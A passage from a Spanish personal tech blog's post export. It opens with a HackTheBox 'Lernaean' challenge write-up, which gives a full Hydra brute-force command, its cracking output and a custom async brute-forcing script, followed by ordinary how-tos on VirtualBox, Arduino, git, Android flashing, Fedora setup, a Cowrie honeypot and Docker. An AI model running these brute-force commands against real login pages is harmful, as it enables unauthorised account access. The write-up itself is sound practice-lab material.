width=\u0026ldquo;100%\u0026rdquo;}\nSi analizamos la web se puede ver que solo es necesario introducir la contraseña, lo que hará que el ataque por fuerza bruta menos costoso en tiempo de ejecución. Si analizamos la petición que se realiza con el login, ya sea con Burp, Wireshark o el propio navegador vemos que unicamente se envía el campo password y como respuesta recibimos la misma web pero con un Invalid password!.\nSi se realiza el ataque con Hydra, sería necesario indicar los siguientes argumentos:\n1 hydra -l admin -P 10-million-password-list-top-10000.txt docker.hackthebox.eu http-post-form \u0026#34;/:password=^PASS^:Invalid password!\u0026#34; -s 32345 Con lo que obtendríamos una salida similar a esta indicando que la contraseña es leonardo.\n1 2 3 4 5 6 7 8 9 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-11-28 15:17:33 [DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task [DATA] attacking http-post-form://docker.hackthebox.eu:32345/:password=^PASS^:Invalid password! [STATUS] 788.00 tries/min, 788 tries in 00:01h, 9212 to do in 00:12h, 16 active [32345][http-post-form] host: docker.hackthebox.eu login: admin password: leonardo 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-11-28 15:19:42 Si se realiza el ataque con el script propio, que puede encontrase en el siguiente repositorio\n1 python3 bruteforce_post_async.py http://docker.hackthebox.eu:31658/ \u0026#39;Invalid password!\u0026#39; -l admin -P 10-million-password-list-top-10000.txt -j \u0026#39;{\u0026#34;password\u0026#34;:\u0026#34;\u0026#34;}\u0026#39; -v Se obtendría la siguiente salida:\n1 2 3 4 5 DEBUG - bruteforce_post_async - bound_fetch - Trying 1395/10001: user: \u0026#34;admin\u0026#34;, pass: \u0026#34;lancer\u0026#34; -\u0026gt; Fail DEBUG - bruteforce_post_async - bound_fetch - Trying 1401/10001: user: \u0026#34;admin\u0026#34;, pass: \u0026#34;siemens\u0026#34; -\u0026gt; Fail DEBUG - bruteforce_post_async - bound_fetch - Trying 1403/10001: user: \u0026#34;admin\u0026#34;, pass: \u0026#34;minnie\u0026#34; -\u0026gt; Fail DEBUG - bruteforce_post_async - check_regex_response - EXITO WARNING - bruteforce_post_async - bound_fetch - Trying 1404/10001: user: \u0026#34;admin\u0026#34;, pass: \u0026#34;leonardo\u0026#34; -\u0026gt; Success Si introducimos como contraseña leonardo en el login vemos que nos muestra la siguiente pantalla:\n{:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;100%\u0026rdquo;}\nParece que algo no estamos viendo, por eso volvemos a realizar el proceso de login pero en esta ocasión capturamos todos los paquetes que recibimos, ya sea con Burp, Wireshark o el navegador, y veríamos que en la respuesta el POST con el login viene el flag que buscamos, como podemos ver a continuación:\n{:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;100%\u0026rdquo;}\nCabe destacar que se ha calculado los tiempos de ejecución para ambos y han sido los siguientes:\nTiempo de ejecución de hydra: 1m33,668s Tiempo de ejecución de script: 0m4,643s Esto se debe a que mi script manda peticiones asíncronas en bloques de 1000. Posiblemente Hydra también se pueda configurar para que aumente las conexiones paralelas, pero en esta ocasión se han dejado por defecto.\n","date":"2019-11-28T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/lernaean-writeup-hackthebox-web-challenge/","title":"Lernaean Writeup HackTheBox Web Challenge"},{"content":"Para encriptar un post solo es necesario escribir en la cabecera markdown del articulo: Password: secret. Podemos ver un ejemplo a continuación:\nTitle: Test Secret Post Date: 2019-10-31 16:20 Modified: 2019-10-31 16:20 Category: Tags: secret Authors: procamora Slug: test-secret-post Summary: Status: published Password: secret ","date":"2019-10-31T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/test-secret-post/","title":"Test Secret Post. pass: secret"},{"content":"Aquí se va a explicar como exportar el esquemático y el PCB como imágenes, si se quieren usar para diseñar un PCB sera necesario espejar la imagen y aquí no se explica por el momento.\nExportar Esquemático Para exportar el esquemático se puede hacer en formato SVG de la forma:\nFile \u0026gt; Exportar \u0026gt; SVG \u0026gt; Exportar\nUna vez que esta localmente, se podría convertir a formato PDF en caso deseado usando Inkscape, de la forma:\n1 inkscape --file=Schematic.svg --export-area-drawing --without-gui --export-pdf=Schematic.pdf Tambien se puede convertir a formato PNG aumentando el DPI para mejorar la calidad, de la forma:\n1 2 inkscape -f=Schematic.svg --export-area-drawing --without-gui --export-png=Schematic.png \\ --export-dpi=800 Exportar PCB A la hora de exportar el PCB, si se intenta exportar en formato SVG obtendremos una imagen completamente negra, no se el motivo, por lo que se tendrá que exportar en formato PDF para mantener una calidad buena.\nFile \u0026gt; Exportar \u0026gt; PDF\nAquí habrá que realizar un configuración antes de exportar, que será la siguiente:\nGraphics: Full Graphics Type: Capa fusionada Color: Full Color [jtable caption=\u0026ldquo;This is caption\u0026rdquo; th=\u0026ldquo;0\u0026rdquo;] Capas,Exportar Capa superior,Si Capa inferior,Si Capa de serigrafia superior,Si Capa de serigrafia inferir,Si Bordes de placa,Si Multi-Layer,Si Orificio,Si [/jtable]\nUna vez que esta en formato PDF se puede convertir a formato PNG de la siguientes formas:\n1 2 3 4 inkscape -f=Schematic.pdf --export-area-drawing --without-gui --export-png=Schematic.png \\ --export-dpi=800 convert -density 800 Schematic.pdf Schematic.png ","date":"2019-10-30T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/export-easyeda/","title":"Export EasyEda"},{"content":"Listar maquinas virtuales 1 VBoxManage list vms 1 2 3 \u0026#34;FedoraServer\u0026#34; {e5cfa75c-0145-4de8-94ca-fa3357563d6a} \u0026#34;win7_drive_UNI\u0026#34; {be4acbeb-3920-4ada-9d39-00c27adc785c} \u0026#34;Kali\u0026#34; {f355d814-0561-49ea-90a2-71d9124d2957} Arrancar una maquina Se puede arrancar una maquina virutal de dos formas distintas, con el nombre de la maquina o con su identificador.\n1 2 VBoxManage startvm \u0026#34;Kali\u0026#34; VBoxManage startvm f355d814-0561-49ea-90a2-71d9124d2957 Pausar una maquina 1 VBoxManage controlvm \u0026#34;Kali\u0026#34; pause Reiniciar maquina pausada 1 VBoxManage controlvm \u0026#34;Kali\u0026#34; resume Reiniciar maquina inmediatamente 1 VBoxManage controlvm \u0026#34;Kali\u0026#34; reset Apagar maquina 1 VBoxManage controlvm \u0026#34;Kali\u0026#34; poweroff Guardar el estado de una maquina 1 VBoxManage controlvm \u0026#34;Kali\u0026#34; savestate Exportar maquinas virtuales Se pueden exportan en un unico ova todas las maquinas que se deseen\n1 vboxmanage export \u0026#34;s1_lan\u0026#34; \u0026#34;s1_dmz\u0026#34; -o S1.ova Reducir el tamaño que ocupa en disco la maquina 1 2 3 4 5 6 7 8 #!/bin/bash #vboxmanage modifymedium --compact /path/to/thedisk.vdi #vboxmanage modifyhd /path/to/thedisk.vdi --compact script=\u0026#39;vboxmanage modifyhd \u0026#39; find . -type f -name \u0026#34;*.vdi\u0026#34; -exec $script {} --compact \\; ","date":"2019-10-17T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/virtualbox-cli/","title":"Virtualbox cli"},{"content":"Introducción En ocasiones es necesario instalar un bootloader o actualizarlo en una placa Arduino, para realizar esto podemos usar un programador externo o usar otra placa Arduino como programador.\nUn Arduino actuá como programador, al que se le llamara master y el otro que es al que se le va a instalar el bootloader, se le llamará slave. La comunicación entre el PC y el master se hace a través del protocolo serie de esta placa, y la comunicación entre el master y el slave se hace a través del protocolo SPI.\nEste proceso se realizara en dos pasos:\nEl primer paso consiste en programar la Arduino para que actúe como programador. El segundo paso consiste en interconectar los Arduinos y quemar el bootloader. En este caso especifico se va a usar una Arduino Uno como master y una Arduino Pro Mini como slave.\nProgramar Arduino master como ArduinoISP Para preparar la Arduino master como programador, lo único que será necesario es cargar el Sketch \u0026ldquo;Arduino as ISP\u0026rdquo;, esto se realiza de la siguiente forma:\nCargar el Sketch:\nFile \u0026gt; Examples \u0026gt; 11.ArduinoISP \u0026gt; ArduinoISP Seleccionar el tipo de placa al que se le va a cargar el Sketch:\nTools \u0026gt; Board \u0026gt; Arduino / Genuino Uno Seleccionamos el programador por defecto:\nTools \u0026gt; Programmer \u0026gt; \u0026quot;AVRISP mkll\u0026quot; Cargar el Sketch:\nUpload Una vez cargado el Sketch ya podemos proceder a interconectar las Arduinos como master y slave para proceder con el quemado del bootloader.\nConectar Arduino Pro Mini como slave Las conexiones se realizan con el protocolo SPI, en la Arduino Uno y Arduino Pro Mini están en los pines 10 al 13, podemos ver las conexión de los pines en la siguiente tabla:\n[jtable caption=\u0026ldquo;This is caption\u0026rdquo; th=\u0026ldquo;0\u0026rdquo;] Master (Arduino Uno),Slave (Arduino Pro mini) Pin 13 (SCK),Pin 13 (SCK) Pin 12 (MISO),Pin 12 (MISO) Pin 11 (MOSI),Pin 11 (MOSI) Pin 10 (SS),Reset 5V,5V GND,GND [/jtable]\nPodemos ver la imagen de las conexiones realizadas a continuación:\n{:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;100%\u0026rdquo;}\nQuemar bootloader Una vez que están realizadas todas las conexiones solo queda quemar el bootloader, para esto hay que seguir los siguientes pasos:\nSeleccionar el tipo de placa del tipo que es el slave:\nTools \u0026gt; Board \u0026gt; Arduino Pro or Arduino Pro Mini Seleccionamos el programador:\nTools \u0026gt; Programmer \u0026gt; \u0026quot;Arduino as ISP\u0026quot; Quemamos el bootloader:\nTools \u0026gt; Burn Bootloader Veremos como parpadean las luces de la Arduino master durante unos segundos y después se completara el proceso.\nEsquema placa para quemar el bootloader en un procesador ATmega328P En el caso de querer quemar el bootloader en una placa microcontroladora ATmega328P, podremos hacerlo siguiendo el siguiente esquema:\n{:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;100%\u0026rdquo;}\n{:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;100%\u0026rdquo;}\nPodemos descargar el esquemático y el PCB de EasyEDA desde aquí: Esquemático, PCB\nFuentes: 0\n","date":"2019-10-08T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/arduino-bootloader/","title":"Arduino burn bootloader"},{"content":"Pasos iniciales para crear una rama local y remota de desarrollo y de trabajo Creamos la rama de desarrollo\n1 2 3 4 5 # Crear una rama local de desarrollo y movernos a ella git checkout -b dev # Crear rama remota de desarrollo git push origin dev Creamos la rama de trabajo\n1 2 3 4 5 # Crear una rama local de desarrollo y movernos a ella git checkout -b watchdog # Crear rama remota de desarrollo git push origin watchdog Pasos comunes de trabajo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #!/bin/bash # Commit repositorio actual git add . git commit -m \u0026#34;subida script\u0026#34; #git push origin watchdog # con el commit en local ya se puede hacer el merge y subirlo directamente a dev # Merge dev git checkout dev git pull origin dev git merge watchdog git push origin dev # Eliminacion de rama y creación de nueva rama de trabajo git branch -D watchdog git push origin :watchdog git checkout -b watchdog git push origin watchdog ","date":"2019-10-08T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/tips-git/","title":"Tips Git"},{"content":"Status: published\nVamos a explicar el proceso para flashear la Nexus 9 LTE con distintas ROMs mediante adb sideload. Este es un proceso bastante mas simple y rápido que los que se realizaban antiguamente. Se puede realizar en cualquier dispositivo.\nEste procedimiento ha sido probado con las ROMs de LineageOS y SlimRoms.\nRequisitos básicos Tener instalado adb y fastboot. Tener habilitado el USB debugging en el dispositivo. Verificar que se tiene permiso para ejecutar adb con el usuario. En caso de no tener permiso realizarlo con root.\nDesbloquear el bootloader Si esta activado el bloqueo OEM hay que desactivarlo en las opciones de desarrollo.\nReiniciamos el dispositivo en modo fastboot:\n1 adb reboot bootloader ``\nTambién se puede hacer presionando las teclas: Bajar volumen y Power con el dispositivo apagado hasta que aparezca el gestor de arranque. Después seleccionar FASTBOOT y pulsar Power.\nVerificar que el dispositivo esta en modo FASTBOOT con:\n1 fastboot devices ``\n1 HT51EWV00595 fastboot ``\nSi el dispositivo esta bloqueado con OEM hay que desbloquearlo con:\n1 fastboot oem unlock ``\n1 2 3 4 (bootloader) ability is 1 (bootloader) Device stete is unlock already OKAY [ 0.142s] Finished. Total time: 0.142s ``\nEste comando reiniciara el dispositivo automáticamente.\nInstalar un recovery personalizado usando fastboot Descargar un recovery personalizado, como por ejemplo TWRP. Este tendrá un formato similar a twrp-x.x.x-x-flounder.img.\nImportante, descargar el recovery des dispositivo que vas a usar puedes buscarlo en https://twrp.me/Devices/\nReiniciar el dispositivo en modo FASTBOOT, para ello es necesario que el dispositivo este encendido. Este paso se puede saltar si ya se tenia desbloqueado el OEM, ya que el dispositivo no se habrá reiniciado y seguirá en modo FASTBOOT.\n1 adb reboot bootloader ``\nVerificar que el dispositivo esta en modo FASTBOOT con:\n1 fastboot devices ``\n1 HT51EWV00595 fastboot ``\nFlashear el dispositivo con la imagen previamente descargada:\n1 fastboot flash recovery \u0026lt;recovery_filename\u0026gt;.img ``\n1 2 3 4 Sending \u0026#39;recovery\u0026#39; (13254 KB) OKAY [ 0.761s] Writing \u0026#39;recovery\u0026#39; (bootloader) Device State : Unlocked OKAY [ 1.034s] Finished. Total time: 1.800s ``\nReiniciar el dispositivo en modo recovery, esto se puede realizar manualmente usando las teclas de Volumen y Power o con el comando:\n1 fastboot boot \u0026lt;recovery_filename\u0026gt;.img ``\n1 2 3 Downloading \u0026#39;boot.img\u0026#39; OKAY [ 0.740s] booting OKAY [ 0.174s] Finished. Total time: 0.919s ``\nInstalar ROM desde el recovery Descargar la ROM deseada, en mi caso ha sido SlimRoms.\nDescargar las Google Apps, están disponibles en OpenGApps. Para la Nexus 9 hay que seleccionar como plataforma ARM64. Con la nano es suficiente.\nUna vez descargados los ficheros que vamos a utilizar, tenemos que estar en el modo Recovery con TWRP.\nVamos al menú de Wipe\nSeleccionamos Format Data y escribimos yes. Este proceso elimina la encriptación del disco y borra los datos de la memoria interna. Volvemos al menú de Wipe y seleccionamos Advanced Wipe. Aquí seleccionamos Cache y System para hacer un wipe de estas particiones Finalmente solo queda instalar la ROM y las GApps, para hacer esto vamos a Advanced y después a ADB Sideload, hacemos swipe para iniciar el sideload, después de cada instalación es necesario volver a iniciarlo.\nInstalamos la ROM Instalamos las GApps 1 2 adb sideload rom.zip adb sideload gapps.zip ``\nIMPORTANTE: Instalar FED-Patcher v7 (ForceEncrypt Disable Patcher), solo en la Nexus 9 con el objetivo de que el disco no se cifre, ya que reduce el rendimiento y se nota bastante. Podemos descargarlo tanto del foro xda, donde su creador lo ha publicado como desde aquí.\n1 adb sideload fed_patcher_v7-signed.zip ``\nUna vez instalado todo lo necesario reiniciar el dispositivo y esperar a que arranque con normalidad, puede llegar a tardar mas de 10 minutos.\n1 adb reboot ``\nComo fuente para la realización de este manual se ha usado: 0\n","date":"2019-10-03T00:00:00Z","image":"https://www.procamora.com/covers/android.png","permalink":"https://www.procamora.com/p/flashear-nexus-9/","title":"Flashear Nexus 9"},{"content":"Para comprimir un repositorio git y reducir su tamaño podemos usar los siguientes comandos:\n1 2 git reflog expire --all --expire=now git gc --prune=now --aggressive Fuente: 0\n","date":"2019-04-27T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/reducir-tamano-repositorio-git/","title":"Reducir tamaño repositorio git"},{"content":"Introducción En esta primera parte pondré todos las librerías y programas que suelo instalar en Fedora 30, en la segunda parte haré una configuración del entorno de trabajo (fstab, crontab, .ssh, etc)\nRPMFusion Librerias basicas Compilación Compresión Codecs DVD\u0026rsquo;s Programas basicos HP Insync Pandoc y Latex Spotify Atom Visual Studio Code Skype Teamviewer Dropbox Gitkraken Pycharm Telegram Eclipse Docker y Docker-Compose Google Chrome Google Music system-config-samba Drivers Nvidia Peek Sublime Text 3 y Sublime Merge OpenRazer y Polychromatic Importante Primero tenemos que instalar los drivers de nvidia que están en la sección Drivers nvidia\nActualización inicial Lo primero que hay que hacer es actualizar el sistema y lo reiniciamos, posiblemente haya una gran cantidad de paquetes a actualizar, junto con la actualización del kernel por lo que después es bueno hacer un reinicio del sistema.\n1 2 sudo dnf update reboot Eliminar programas no necesarios 1 sudo dnf remove dragon calligra-core Añadir repositorio RPMFusion Este repositorio es necesario para varios paquetes que instalaremos después (contiene programas importantes y paquetes nonfree).\n1 sudo dnf -y install https://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-$(rpm -E %fedora).noarch.rpm Paquetes y librerías que mas uso Conjunto de librerías y utilidades básicas, traducciones de programas a español, corrector ortográficos, etc.\n1 2 3 4 sudo dnf -y install kde-i18n-Spanish mythes-es hyphen-es autocorr-es hunspell-es langpacks-es \\ aspell-es man-pages-es-extra kde-l10n-es android-tools expect flac-libs \\ fluid-soundfont-common encfs samba wine curl system-config-users meld youtube-dl \\ wget iftop trash-cli Java 1 sudo dnf -y install java-openjdk java-1.8.0-openjdk-javadoc java-1.8.0-openjdk-devel Herramientas básicas de compilación Conjunto de librerías básicas de compilación\n1 2 sudo dnf -y install kernel-headers kernel-devel git make libxml2 libxml2-devel mercurial \\ cmake python-devel python3-devel gcc-c++ dkms openssl-devel Compresión y descompresión Conjunto de librerías básicas de compresión y descompresión\n1 sudo dnf -y install p7zip p7zip-plugins zip unzip unrar Codecs Conjunto de codecs necesarios para la reproducción de audio con código privado (mp3, etc)\n1 2 3 4 5 6 sudo dnf -y install gstreamer gstreamer1-libav gstreamer1-plugins-bad-free-extras \\ gstreamer1-plugins-bad-freeworld gstreamer1-plugins-good-extras pavucontrol \\ gstreamer-ffmpeg gstreamer-plugins-bad gstreamer-plugins-bad-free-extras \\ gstreamer-plugins-ugly ffmpeg ffmpeg-libs libmatroska xvidcore libva-vdpau-driver \\ libvdpau libvdpau-devel gstreamer1-vaapi gstreamer1-plugins-base-tools mencoder \\ alsa-firmware gstreamer1-plugins-ugly Soporte para DVD\u0026rsquo;s Conjunto de librerías necesarias para la reproducción de DVD\u0026rsquo;s\n1 sudo dnf -y install lsdvd libdvbpsi libdvdread libdvdnav Programas básicos 1 2 3 sudo dnf -y install VirtualBox vim yakuake libreoffice libreoffice-langpack-es \\ gnome-disk-utility sqlitebrowser gimp vlc fritzing kdenlive frei0r-plugins \\ calibre picard chromaprint-tools arduino vokoscreen filezilla Dispositivos HP (impresora) 1 sudo dnf -y install hplip hplip-common libsane-hpaio hplip-gui Insync 1 2 3 4 5 6 7 8 9 sudo rpm --import https://d2t3ff60b2tol4.cloudfront.net/repomd.xml.key sudo echo \u0026#34;[insync] name=insync repo baseurl=http://yum.insynchq.com/fedora/29/ gpgcheck=1 gpgkey=https://d2t3ff60b2tol4.cloudfront.net/repomd.xml.key enabled=1 metadata_expire=120m\u0026#34; \u0026gt; /etc/yum.repos.d/insync.repo sudo dnf install insync Pandoc y Latex 1 2 sudo dnf -y install pandoc texstudio texlive texlive texlive-latex texlive-xetex texlive-xetex-def \\ texlive-collection-latexrecommended texlive-collection-xetex texlive-collection-latex También serán necesarias un conjunto de librerías de Latex:\n1 2 3 4 sudo dnf -y install texlive-matlab-prettifier texlive-apacite texlive-breakcites texlive-xpatch \\ texlive-multirow texlive-tikzpagenodes texlive-tikzmark texlive-pgfplots texlive-glossaries-spanish \\ texlive-anyfontsize texlive-framed texlive-mdframed texlive-todonotes texlive-glossaries \\ texlive-IEEEtran.noarch texlive-textpos Spotify 1 2 sudo dnf config-manager --add-repo=http://negativo17.org/repos/fedora-spotify.repo sudo dnf -y install spotify-client Atom 1 2 3 4 programa=\u0026#34;atom.x86_64.rpm\u0026#34; wget -O $programa https://atom.io/download/rpm sudo dnf -y install $programa rm $programa Visual Studio Code 1 2 3 4 sudo rpm --import https://packages.microsoft.com/keys/microsoft.asc sudo sh -c \u0026#39;echo -e \u0026#34;[code]\\nname=Visual Studio Code\\nbaseurl=https://packages.microsoft.com/yumrepos/vscode\\nenabled=1\\ngpgcheck=1\\ngpgkey=https://packages.microsoft.com/keys/microsoft.asc\u0026#34; \u0026gt; /etc/yum.repos.d/vscode.repo\u0026#39; dnf check-update sudo dnf -y install code Skype 1 sudo dnf -y install https://go.skype.com/skypeforlinux-64.rpm Teamviewer 1 sudo dnf -y install https://download.teamviewer.com/download/linux/teamviewer.x86_64.rpm Dropbox 1 2 sudo dnf -y install https://www.dropbox.com/download?dl=packages/fedora/nautilus-dropbox-2015.10.28-1.fedora.x86_64.rpm sudo dnf -y install python-gpgme Gitkraken 1 2 3 4 programa=\u0026#34;gitkraken-amd64.tar.gz\u0026#34; wget -O $programa https://release.gitkraken.com/linux/gitkraken-amd64.tar.gz mv $programa ~/Programas/ \u0026amp;\u0026amp; cd ~/Programas/ tar -xvf $programa \u0026amp;\u0026amp; rm $programa \u0026amp;\u0026amp; cd - Pycharm Community 1 2 3 4 programa=\u0026#34;pycharm-community-2017.1.tar.gz\u0026#34; wget -O $programa https://download.jetbrains.com/python/pycharm-community-2017.1.tar.gz mv $programa ~/Programas/ \u0026amp;\u0026amp; cd ~/Programas/ tar -xvf $programa \u0026amp;\u0026amp; rm $programa \u0026amp;\u0026amp; cd - Telegram 1 2 3 4 programa=\u0026#34;telegram.tar.xz\u0026#34; wget -O $programa https://tdesktop.com/linux mv $programa ~/Programas/ \u0026amp;\u0026amp; cd ~/Programas/ tar -xvf $programa \u0026amp;\u0026amp; rm $programa \u0026amp;\u0026amp; cd - Eclipse 1 2 3 4 programa=\u0026#34;eclipse-inst-linux64.tar.gz\u0026#34; wget -O $programa http://mirror.ibcp.fr/pub/eclipse//oomph/epp/neon/R2a/eclipse-inst-linux64.tar.gz mv $programa ~/Programas/ \u0026amp;\u0026amp; cd ~/Programas/ tar -xvf $programa \u0026amp;\u0026amp; rm $programa \u0026amp;\u0026amp; cd - Docker y Docker-Compose 1 2 3 4 5 6 7 8 sudo dnf -y install dnf-plugins-core sudo dnf config-manager \\ --add-repo \\ https://download.docker.com/linux/fedora/docker-ce.repo sudo dnf install docker-ce docker-ce-cli containerd.io sudo curl -L \u0026#34;https://github.com/docker/compose/releases/download/1.24.0/docker-compose-$(uname -s)-$(uname -m)\u0026#34; -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose Fuentes: docker y docker-compose\nGoogle Chrome Descargar RPM de aqui: url\nGoogle Music Descargar RPM de aqui: url\nsystem-config-samba Descargar RPM de aqui: url\nInstalar drivers Nvidia Opcion recomendable\nPrimero instalamos los repositorios que necesitamos url\n1 2 3 4 5 6 7 8 #RPM Fusion free for Fedora 30 sudo dnf -y install https://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-$(rpm -E %fedora).noarch.rpm #RPM Fusion nonfree for Fedora 30 sudo dnf -y install https://download1.rpmfusion.org/nonfree/fedora/rpmfusion-nonfree-release-$(rpm -E %fedora).noarch.rpm # Enable access to both the free and the nonfree repository sudo dnf -y install https://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-$(rpm -E %fedora).noarch.rpm https://download1.rpmfusion.org/nonfree/fedora/rpmfusion-nonfree-release-$(rpm -E %fedora).noarch.rpm Una vez instalados instalamos los drivers de nvidia url\n1 2 3 sudo dnf -y install xorg-x11-drv-nvidia akmod-nvidia sudo dnf -y install xorg-x11-drv-nvidia-cuda #optional for cuda/nvdec/nvenc support sudo dnf update -y Opcion no recomendable pero que funciona:\n1 https://www.if-not-true-then-false.com/2015/fedora-nvidia-guide/ Fuente: url\nPeek para grabar la pantalla y crear gif/mp4 1 2 sudo dnf config-manager --add-repo http://download.opensuse.org/repositories/home:/Bajoja/Fedora_29/home:Bajoja.repo sudo dnf -y install peek Sublime Text 3 y Sublime Merge 1 2 3 sudo rpm -v --import https://download.sublimetext.com/sublimehq-rpm-pub.gpg sudo dnf config-manager --add-repo https://download.sublimetext.com/rpm/stable/x86_64/sublime-text.repo sudo dnf -y install sublime-text sublime-merge OpenRazer y Polychromatic 1 2 3 4 5 # Due to a bug in Fedora, the wrong kernel headers (kernel-debug-devel) may be installed and cause OpenRazer to fail installation. sudo dnf install kernel-devel sudo dnf config-manager --add-repo https://download.opensuse.org/repositories/hardware:razer/Fedora_30/hardware:razer.repo sudo dnf install openrazer-meta polychromatic # reboot Url gitgub\n","date":"2019-04-14T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/primeros-pasos-fedora-30-parte-i/","title":"Primeros pasos Fedora 30 KDE Parte I"},{"content":"Requisitos Tenemos que tener instalado docker\nInstalación de la imagen y creación del contenedor Para instalar la imagen y crear el contenedor usaremos:\n1 2 docker pull ouspg/cowrie docker run -dit -p 2222:2222 -p 2223:2223 -v $(pwd)/dl:/home/cowrie/cowrie/dl -v $(pwd)/log:/home/cowrie/cowrie/log ouspg/cowrie Para obtener una consola del contenedor en ejecución usaremos:\n1 docker exec -it [CONTAINER_ID] sh vim no esta instalado, solo esta vi, todos los ficheros están en el directorio local\nSi tenemos parada la maquina y queremos volver a ejecutarla\n1 docker start [CONTAINER_ID] Configuración de log en la base de datos sqlite Para guardar los log en una base de datos sqlite necesitamos tenemos que conectarnos al contenedor y descomentar las lineas 348 y 348 aproximadamente del fichero cowrie.cfg. Hay que acceder el contendedor para hacer este paso\n1 2 [output_sqlite] db_file = log/cowrie.db # Cuidado, por defecto lo guarda en el directorio local no el log Una vez hecho eso, se te creara la base de datos vacía en el directorio que le hayas indicado y tendrás que cargar las tablas que necesitaremos, esto lo haremos desde nuestra maquina física ya que tenemos linkeado el directorio con el volumen del contenedor, ejecutando el siguiente comando:\n1 sqlite3 cowrie.db \u0026lt; sqlite3.sql El fichero sqlite3.sql será:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 CREATE TABLE IF NOT EXISTS `auth` ( `id` INTEGER PRIMARY KEY, `session` char(32) NOT NULL, `success` tinyint(1) NOT NULL, `username` varchar(100) NOT NULL, `password` varchar(100) NOT NULL, `timestamp` datetime NOT NULL ) ; CREATE TABLE IF NOT EXISTS `clients` ( `id` INTEGER PRIMARY KEY, `version` varchar(50) NOT NULL ) ; CREATE TABLE IF NOT EXISTS `input` ( `id` INTEGER PRIMARY KEY, `session` char(32) NOT NULL, `timestamp` datetime NOT NULL, `realm` varchar(50) default NULL, `success` tinyint(1) default NULL, `input` text NOT NULL ) ; CREATE INDEX input_index ON input(session, timestamp, realm); CREATE TABLE IF NOT EXISTS `sensors` ( `id` INTEGER PRIMARY KEY, `ip` varchar(15) NOT NULL ) ; CREATE TABLE IF NOT EXISTS `sessions` ( `id` char(32) NOT NULL PRIMARY KEY, `starttime` datetime NOT NULL, `endtime` datetime default NULL, `sensor` int(4) NOT NULL, `ip` varchar(15) NOT NULL default \u0026#39;\u0026#39;, `termsize` varchar(7) default NULL, `client` int(4) default NULL ) ; CREATE INDEX sessions_index ON sessions(starttime, sensor); CREATE TABLE IF NOT EXISTS `ttylog` ( `id` INTEGER PRIMARY KEY, `session` char(32) NOT NULL, `ttylog` varchar(100) NOT NULL, `size` int(11) NOT NULL ) ; CREATE TABLE IF NOT EXISTS `downloads` ( `id` INTEGER PRIMARY KEY, `session` CHAR( 32 ) NOT NULL, `timestamp` datetime NOT NULL, `url` text NOT NULL, `outfile` text NOT NULL, `shasum` varchar(64) default NULL ) ; CREATE INDEX downloads_index ON downloads(session, timestamp); CREATE TABLE IF NOT EXISTS `keyfingerprints` ( `id` INTEGER PRIMARY KEY, `session` CHAR( 32 ) NOT NULL, `username` varchar(100) NOT NULL, `fingerprint` varchar(100) NOT NULL ) ; ","date":"2018-10-29T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/configuracion-cowrie/","title":"Configuración Cowrie"},{"content":"Primeros pasos en la instalación y uso de docker\nInstalación y configuración 1 2 3 4 5 6 7 dnf config-manager --add-repo https://download.docker.com/linux/fedora/docker-ce.repo dnf install docker-ce usermod -aG docker procamora newgrp docker # Esto permite “refrescar” el grupo sin tener que reiniciar systemctl enable docker systemctl start docker docker run hello-world # Confirmar que esta bien instalado Buscamos la imagen que necesitemos 1 docker search cowrie Nos descargamos las imágenes que necesitemos 1 2 docker pull ouspg/cowrie docker pull kalilinux/kali-linux-docker Mostrar las imágenes disponibles 1 docker images Crear el contenedor (Solo ejecutar la primera vez) 1 2 3 4 5 6 7 docker run [IMAGE] docker run hello-world docker run -it -p 2222:2222 -p 2223:2223 cowrie/cowrie docker run -it -p 8081:80 httpd # Host anfitrión 8081 , Docker 80 docker run -it --name=\u0026#34;webserver\u0026#34; -p 8081:80 httpd # Asignamos un nombre docker run -it kalilinux/kali-linux-docker /bin/bash # También te abre una consola al SO docker run -dit -p 2222:2222 -p 2223:2223 -v $(pwd)/dl:/home/cowrie/cowrie/dl -v $(pwd)/log:/home/cowrie/cowrie/log ouspg/cowrie # -d lo lanza como demonio -v para montar los volumenes entre la maquina fisica y el contenedor Iniciar un contenedor previamente creado 1 2 3 docker ps -a # Vemos los contenedores creados docker start [CONTAINER_ID] docker start e7d1b0de6fe9 Entrar en un contenedor en ejecución: 1 2 3 docker ps -a docker exec -it [CONTAINER_ID] bash docker exec -it e7d1b0de6fe9 bash Borrar un contenedor creado 1 2 3 docker ps -a # Vemos los contenedores creados docker rm [CONTAINER_ID] docker rm e7d1b0de6fe9 Borrar una imagen descargada 1 2 3 docker images docker rmi [IMAGE] docker rmi httpd Modificar etiqueta 1 docker tag httpd a/b:latest Guardar una imagen 1 docker commit 